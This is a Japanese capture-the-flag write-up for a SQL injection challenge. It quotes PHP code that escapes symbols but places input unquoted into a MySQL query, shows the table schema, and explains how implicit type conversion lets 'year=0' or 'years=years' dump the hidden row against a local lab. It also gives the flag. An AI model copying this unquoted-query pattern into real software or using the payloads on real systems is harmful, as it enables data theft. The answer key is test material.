# SQL_Challenge_2

```txt
やっぱり前のページは危ない気がするからページを作り直したよ。これで大丈夫だね。

(Hint)

SQL injectionの問題です。

必要に応じてソースコード(index.php)とデータベースのスキーマ(1_schema.sql)を参考にしてください。

(注意)

sql-chall-2.zipは問題を解くために必須の情報ではなく、docker-composeを利用してローカルで問題環境を再現するためのものです。

興味のある方は利用してみてください。

writer : okmt, nkt
```

## Solution

問題にアクセスすると前の問題の改良版になってます。

配布ファイル(`index.php`)を見てみると、以下の部分が改良されていることがわかります。

```php
//urlの"year="の後に入力した文字列を$yearに入れる。
$year = $_GET["year"];

//preg_replaceで危険な記号を処理する。
$pattern = '/([^a-zA-Z0-9])/';
$replace = '\\\$0';
$year = preg_replace($pattern, $replace, $year);

//クエリを作成する。
$query = "SELECT * FROM anime WHERE years = $year";
```

これより、`a-zA-Z0-9` 以外の文字列が `\` でエスケープされるように改良されています。

次に配布ファイル(`1_schema.sql`)のDBスキーマを見てみます。

```sql
DROP TABLE IF EXISTS anime;

CREATE TABLE anime (
    name VARCHAR(32) NOT NULL,
    years VARCHAR(32) NOT NULL,
    PRIMARY KEY (name)
);
```

すると `years` が `number` (数値型)ではなく、`VARCHAR` (文字列型)で定義されていることがわかります。

MySQL の比較演算には、比較対象の一方が数値ならもう片方も数値として扱うという暗黙の型変換が行われます。

これより `years` カラムに数値以外の文字列は、全て `0` に変換されると思われます。

なのでパラメータを `years = 0` とすると数値以外の文字列のデータが表示されて、 flag を得ることができます。

また、`year=false` のようでも同じような実行結果となります。

```shell
$ curl http://localhost:8080/index.php?year=0
 ...

                    <!-- debug : SELECT * FROM anime WHERE years = 0 -->
<tr><th>FLAG{5ql_ch4r_cf_ca87b27723}</th><th>fl46_5b438f8c11a5aade00a66bea6f7</th></tr>
 ...
```

非想定解として、`years = years` でも条件を真にして flag を得ることができるそうです。

## Flag

```txt
FLAG{5ql_ch4r_cf_ca87b27723}
```
